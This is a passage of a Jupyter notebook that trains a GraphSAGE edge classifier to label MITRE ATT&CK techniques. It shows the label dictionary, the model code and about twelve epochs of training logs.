       " 142: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B',\n",
       " 143: 'T1546.013_f9a968af61d36983448c74cca5464e17_I',\n",
       " 144: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B',\n",
       " 145: 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B',\n",
       " 146: 'T1112_fd992e8ecfdac9b56dd6868904044827_I',\n",
       " 147: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I',\n",
       " 148: 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B',\n",
       " 149: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I',\n",
       " 150: 'T1003_18f31c311ac208802e88ab8d5af8603e_B',\n",
       " 151: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B',\n",
       " 152: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I',\n",
       " 153: 'T1105_e6715e61f5df646692c624b3499384c4_I',\n",
       " 154: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B',\n",
       " 155: 'T1201_57296a2ddbeb7423c05feef2fe972111_B',\n",
       " 156: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B',\n",
       " 157: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I',\n",
       " 158: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I',\n",
       " 159: 'T1490_e90756bb6dcd21462dc4cc452661df91_B',\n",
       " 160: 'T1547.009_b6e5c895c6709fe289352ee23f062229_B',\n",
       " 161: 'T1007_d6bb2a19da7246731ed9c44831b135f8_B',\n",
       " 162: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B',\n",
       " 163: 'T1562.001_43e3334362b140924f001b256b229ee5_B',\n",
       " 164: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I',\n",
       " 165: 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B',\n",
       " 166: 'T1105_4f683658f161ccdc51337c470d32bab9_I',\n",
       " 167: 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B',\n",
       " 168: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B',\n",
       " 169: 'T1112_cd8be0e6b873919da25530a2c7ea6750_I',\n",
       " 170: 'T1531_aa6b15485a5f50ced34d87fda177b758_B',\n",
       " 171: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B',\n",
       " 172: 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B',\n",
       " 173: 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B',\n",
       " 174: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B',\n",
       " 175: 'T1016_71b3d2945679566b9d94d8cb11df4b70_B',\n",
       " 176: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B',\n",
       " 177: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B',\n",
       " 178: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B',\n",
       " 179: 'T1562.001_43e3334362b140924f001b256b229ee5_I',\n",
       " 180: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B',\n",
       " 181: 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B',\n",
       " 182: 'T1003.001_35d92515122effdd73801c6ac3021da7_B',\n",
       " 183: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B',\n",
       " 184: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B',\n",
       " 185: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I',\n",
       " 186: 'T1490_c156ac5c9fa67080365268d95f29053d_B',\n",
       " 187: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B',\n",
       " 188: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I',\n",
       " 189: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I',\n",
       " 190: 'T1003_18f31c311ac208802e88ab8d5af8603e_I',\n",
       " 191: 'T1547.009_b6e5c895c6709fe289352ee23f062229_I',\n",
       " 192: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B',\n",
       " 193: 'T1112_e7a987cbef27263e666e5b096488dc55_I',\n",
       " 194: 'T1112_35c0360d226cf38104f300d9d57ce60e_B',\n",
       " 195: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I',\n",
       " 196: 'T1490_8467c994685ccf178db166964bd80fab_B',\n",
       " 197: 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B',\n",
       " 198: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B',\n",
       " 199: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I',\n",
       " 200: 'T1486_d82ceb9939d3d920ee550187ad8235c8_B',\n",
       " 201: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B',\n",
       " 202: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B',\n",
       " 203: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I',\n",
       " 204: 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B',\n",
       " 205: 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B',\n",
       " 206: 'T1547.001_163b023f43aba758d36f524d146cb8ea_I',\n",
       " 207: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I',\n",
       " 208: 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B',\n",
       " 209: 'T1482_cfb61005899996469ae3023796792ca5_B',\n",
       " 210: 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B',\n",
       " 211: 'T1003.003_f049b89533298c2d6cd37a940248b219_B',\n",
       " 212: 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B',\n",
       " 213: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I',\n",
       " 214: 'T1071.001_24c3b7b004401d839a5c337201da3484_I',\n",
       " 215: 'T1105_c76968acda4aa1673dadcd67f3ab7664_B',\n",
       " 216: 'T1491_68235976-2404-42a8-9105-68230cfef562_I',\n",
       " 217: 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B',\n",
       " 218: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B',\n",
       " 219: 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B',\n",
       " 220: 'T1071.001_24c3b7b004401d839a5c337201da3484_B',\n",
       " 221: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I',\n",
       " 222: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I',\n",
       " 223: 'T1562.004_5b93df032e230056c21a3e57334f77d1_B',\n",
       " 224: 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B',\n",
       " 225: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I',\n",
       " 226: 'T1112_34041639e6e501856ecaf5969ee29c76_B',\n",
       " 227: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I',\n",
       " 228: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B',\n",
       " 229: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I',\n",
       " 230: 'T1112_e74d2fb4ef5fa6c766a4151554033697_I',\n",
       " 231: 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B',\n",
       " 232: 'T1564.001_66a5fd5f244819181f074dd082a28905_I',\n",
       " 233: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B',\n",
       " 234: 'T1003.001_35d92515122effdd73801c6ac3021da7_I',\n",
       " 235: 'T1219_7dabcbecab0334b115feefab1630f84a_B',\n",
       " 236: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I',\n",
       " 237: 'T1049_a14392d713dffba6a397682ff83259a0_B',\n",
       " 238: 'T1047_f4b0b4129560ea66f9751275e82f6bab_I',\n",
       " 239: 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B',\n",
       " 240: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B',\n",
       " 241: 'T1047_b0255b5120cbabc062d8d4510a142c3b_B',\n",
       " 242: 'T1112_cd8be0e6b873919da25530a2c7ea6750_B',\n",
       " 243: 'T1112_cab7b85611a290c0769546bfa9d6f962_B',\n",
       " 244: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I',\n",
       " 245: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I',\n",
       " 246: 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B',\n",
       " 247: 'T1016_921055f4-5970-4707-909e-62f594234d91_I',\n",
       " 248: 'T1018_ac20e592bc912bddff4d6b88289095f0_B',\n",
       " 249: 'T1562.004_5b93df032e230056c21a3e57334f77d1_I',\n",
       " 250: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B',\n",
       " 251: 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B',\n",
       " 252: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I',\n",
       " 253: 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B',\n",
       " 254: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I',\n",
       " 255: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B',\n",
       " 256: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I',\n",
       " 257: 'T1564.001_66a5fd5f244819181f074dd082a28905_B',\n",
       " 258: 'O',\n",
       " 259: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I',\n",
       " 260: 'T1105_4f683658f161ccdc51337c470d32bab9_B',\n",
       " 261: 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B',\n",
       " 262: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B',\n",
       " 263: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B',\n",
       " 264: 'T1059.003_6c318ef0339d74d909ad556681b6493e_I',\n",
       " 265: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B',\n",
       " 266: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I',\n",
       " 267: 'T1547.004_0856714c9810ac55b53e9964d02958a0_I',\n",
       " 268: 'T1016_7d8ee68f0e9731db82964f558f614608_B',\n",
       " 269: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B',\n",
       " 270: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B',\n",
       " 271: 'T1112_e74d2fb4ef5fa6c766a4151554033697_B',\n",
       " 272: 'T1119_7121cdf93b951311be9d7078c602efdc_B',\n",
       " 273: 'T1115_70795de7cbb842edb029b3378c27c008_B'}"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index2label = {v: k for k, v in label2index.items()}\n",
    "\n",
    "index2label"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8ff8c620",
   "metadata": {},
   "source": [
    "# Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "35625234",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphSAGE(nn.Module):\n",
    "    def __init__(self, in_dim, hidden_dim, out_dim):\n",
    "        super(GraphSAGE, self).__init__()\n",
    "        self.layer1 = dglnn.SAGEConv(in_dim, hidden_dim, 'pool')\n",
    "        self.layer2 = dglnn.SAGEConv(hidden_dim, out_dim, 'pool')\n",
    "        self.dropout = nn.Dropout(0.25)\n",
    "\n",
    "    def forward(self, g, inputs):\n",
    "        h = self.layer1(g, inputs)\n",
    "        h = torch.relu(h)\n",
    "        h = self.dropout(h)\n",
    "        h = self.layer2(g, h)\n",
    "        return h\n",
    "    \n",
    "class MLPPredictor(nn.Module):\n",
    "    def __init__(self, out_feats, out_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.W = nn.Linear(out_feats*2 + edge_embedding_dim, out_classes)\n",
    "\n",
    "    def apply_edges(self, edges, edge_feat):\n",
    "        h_u = edges.src['h']\n",
    "        h_v = edges.dst['h']\n",
    "        h_e = edge_feat\n",
    "        score = self.W(torch.cat([h_u, h_v, h_e], 1))\n",
    "        return {'score': score}\n",
    "\n",
    "    def forward(self, graph, h, edge_feat):\n",
    "        with graph.local_scope():\n",
    "            graph.ndata['h'] = h\n",
    "            # graph.apply_edges(self.apply_edges)\n",
    "            graph.apply_edges(lambda edges: self.apply_edges(edges, edge_feat))\n",
    "            return graph.edata['score']\n",
    "        \n",
    "class Model(nn.Module):\n",
    "    def __init__(self, in_features, hidden_features, out_features, num_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.sage = GraphSAGE(in_features, hidden_features, out_features)\n",
    "        self.pred = MLPPredictor(out_features, num_classes, edge_embedding_dim)\n",
    "      \n",
    "    def forward(self, g, node_feat, edge_feat, return_logits=False):\n",
    "        h = self.sage(g, node_feat)\n",
    "        logits = self.pred(g, h, edge_feat)\n",
    "        \n",
    "        return logits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "a2f246b0",
   "metadata": {},
   "outputs": [],
   "source": [
    "def same_seeds(seed = 42):\n",
    "    torch.manual_seed(seed)\n",
    "    if torch.cuda.is_available():\n",
    "        torch.cuda.manual_seed(seed)\n",
    "        torch.cuda.manual_seed_all(seed)  \n",
    "    np.random.seed(seed)  \n",
    "    torch.backends.cudnn.benchmark = False\n",
    "    torch.backends.cudnn.deterministic = True\n",
    "\n",
    "def model_fn(batched_g, model, criterion, device, which_type='train'):\n",
    "    \"\"\"Forward a batch through the model.\"\"\"\n",
    "    batched_g = batched_g.to(device)\n",
    "    \n",
    "    labels = batched_g.edata['label'].to(device)    \n",
    "    # logits = model(batched_g, batched_g.ndata['feat'].float())\n",
    "    logits = model(batched_g, batched_g.ndata['feat'].float(), batched_g.edata['feat'].float())\n",
    "    loss = criterion(logits, labels)\n",
    "\n",
    "    output = torch.softmax(logits, dim=1)\n",
    "    preds = output.argmax(1)\n",
    "    # print(preds)\n",
    "    \n",
    "    accuracy = torch.mean((preds == labels).float())\n",
    "        \n",
    "    return loss, accuracy, preds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "c3032d04-6f91-46f7-840b-3677018f8353",
   "metadata": {},
   "outputs": [],
   "source": [
    "# for data in tqdm(train_dataloader):\n",
    "#     print(data)\n",
    "#     print()\n",
    "#     print(data.edata['label'])\n",
    "#     break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "e40b877f-1754-49ec-8e0c-55a3a557c4bf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "274"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(label2index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "6b71dff3-e7c7-475e-bc7f-8e11d654cb38",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "b71e5a05-4b50-4227-9773-90b739931ae8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cuda\n"
     ]
    }
   ],
   "source": [
    "print(device)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "cc9d0d38-29b8-44f3-9577-362523b2bce8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # For release the GPU memory\n",
    "# # No need to restart the kernel\n",
    "\n",
    "# import gc\n",
    "# gc.collect()\n",
    "# torch.cuda.empty_cache()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "c71261a2",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c008e2fb088446986171c8fdd6a355f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/200 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b473e8f5cd104fcb99a4a2f6b1462cb8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:41:59 | INFO | Epoch 0 | Train Loss: 1.6574 | Train Accuracy: 0.6400\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "aa841e6717d24cf8ac95a6e74c6b4870",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:01 | INFO | Validation Loss: 0.9888 | Validation Accuracy: 0.7869\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_0_loss_0.9888_acc_0.7869\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "18cb61ceb7b34b078722532b725fcdac",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:13 | INFO | Epoch 1 | Train Loss: 0.9419 | Train Accuracy: 0.8097\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2bc9a27696a246b29b44ff57e15a1287",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:15 | INFO | Validation Loss: 0.7042 | Validation Accuracy: 0.8379\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_1_loss_0.7042_acc_0.8379\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a689b7615744421fb142f59685c40d03",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:26 | INFO | Epoch 2 | Train Loss: 0.7163 | Train Accuracy: 0.8551\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94f81d64ff97494bba8f5888801aea97",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:28 | INFO | Validation Loss: 0.5745 | Validation Accuracy: 0.8677\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_2_loss_0.5745_acc_0.8677\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9deab7efacb440fc8f4829e760009f36",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:40 | INFO | Epoch 3 | Train Loss: 0.6113 | Train Accuracy: 0.8823\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "61617228a3c5418e9f1e76ab2c700a2b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:41 | INFO | Validation Loss: 0.5143 | Validation Accuracy: 0.8964\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_3_loss_0.5143_acc_0.8964\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "25fed112abe7497286ef2bfc2c9d2a80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:53 | INFO | Epoch 4 | Train Loss: 0.5353 | Train Accuracy: 0.8966\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f36cdc479de46c493474a77df4c9683",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:42:55 | INFO | Validation Loss: 0.4912 | Validation Accuracy: 0.9026\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_4_loss_0.4912_acc_0.9026\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "01e4df741d2c41f1a6074b6f579b9428",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:07 | INFO | Epoch 5 | Train Loss: 0.5107 | Train Accuracy: 0.8975\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2acb83b020734224989a0697db3f44a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:08 | INFO | Validation Loss: 0.4393 | Validation Accuracy: 0.9120\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_5_loss_0.4393_acc_0.9120\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8407cba4591349e1bae875ab8ce249ab",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:21 | INFO | Epoch 6 | Train Loss: 0.4835 | Train Accuracy: 0.9019\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7ad3ff427b04c19ba25b8fcde6105fa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:22 | INFO | Validation Loss: 0.3924 | Validation Accuracy: 0.9203\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_6_loss_0.3924_acc_0.9203\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "baba45d2966b41239d758ddc24e0e7e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:34 | INFO | Epoch 7 | Train Loss: 0.4438 | Train Accuracy: 0.9091\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb7a3fbd7cd143d19619a3030ba10f8e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:36 | INFO | Validation Loss: 0.3521 | Validation Accuracy: 0.9255\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_7_loss_0.3521_acc_0.9255\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a3142a48810b4e5592601cb99a19e785",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:49 | INFO | Epoch 8 | Train Loss: 0.4330 | Train Accuracy: 0.9092\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7fc4d675a4cf40c29752fc4ae6f25d25",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:43:50 | INFO | Validation Loss: 0.4032 | Validation Accuracy: 0.9125\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "57c9bc5823bf495fb20880397430631e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:04 | INFO | Epoch 9 | Train Loss: 0.4256 | Train Accuracy: 0.9099\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4d60c85e1c0944428c3c2ebc68fcb66f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:06 | INFO | Validation Loss: 0.3473 | Validation Accuracy: 0.9264\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_9_loss_0.3473_acc_0.9264\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "294f71debb194059be898e66727d9fd2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:18 | INFO | Epoch 10 | Train Loss: 0.4070 | Train Accuracy: 0.9137\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c868810331d04327af8261d3ba999577",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:20 | INFO | Validation Loss: 0.2797 | Validation Accuracy: 0.9385\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_10_loss_0.2797_acc_0.9385\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "09da3b00bd0040b0b9dea446e5996687",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:32 | INFO | Epoch 11 | Train Loss: 0.3741 | Train Accuracy: 0.9197\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a94d252c2e914aebad2c6b10d9918d75",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:34 | INFO | Validation Loss: 0.3524 | Validation Accuracy: 0.9200\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f053e80ac393417f8b332979cad34332",
       "version_major": 2,
       "version_minor": 0
      },
